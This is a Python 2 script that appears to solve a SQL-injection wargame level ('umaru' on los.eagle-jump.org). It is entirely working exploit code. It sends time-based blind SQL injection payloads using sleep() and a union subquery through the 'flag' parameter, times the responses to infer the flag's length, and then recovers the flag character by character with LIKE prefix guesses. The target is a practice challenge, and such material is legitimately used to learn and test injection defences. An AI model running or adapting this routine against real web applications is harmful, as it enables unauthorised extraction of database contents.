import requests as req
import string
import time
s = req.session()
chrs = string.printable
cookies = {"PHPSESSID":""}
url = 'https://los.eagle-jump.org/umaru.php'


pay = '(select sleep((%s)) = (select 1 union select 2))'
length = 0
start = time.time()
r = s.get(url,params={'flag':pay%'length(flag)'},cookies=cookies)
print pay%'length(pw)'
length = time.time() - start
print '[+] found length around %d'%length
length = int(length)

pay = '(select sleep((%s)*5) = (select 1 union select 2))'
flag = ''
for i in xrange(1,length+1):
	for j in chrs:
		test = 'flag like "%s%%"'%(flag+j)
		print test
		start = time.time()
		r = s.get(url,params={'flag':pay%test},cookies=cookies)
		t = time.time() - start
		if t > 2:
			flag += j
			print flag
			break
print '[+] found flag = '+flag
